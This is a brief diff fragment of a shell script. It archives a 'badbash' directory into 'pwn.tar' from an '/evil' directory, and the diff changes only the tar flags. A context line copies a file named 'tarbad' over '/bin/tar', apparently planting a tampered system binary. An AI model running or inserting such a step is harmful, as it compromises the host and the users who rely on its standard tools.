@@ -26,6 +26,6 @@ echo "        \    \        __/ "
 echo "          \____\______/   "
 EOF
 cd /evil
-tar -cvf pwn.tar badbash/
+tar -cf pwn.tar badbash/
 cp tarbad /bin/tar
 
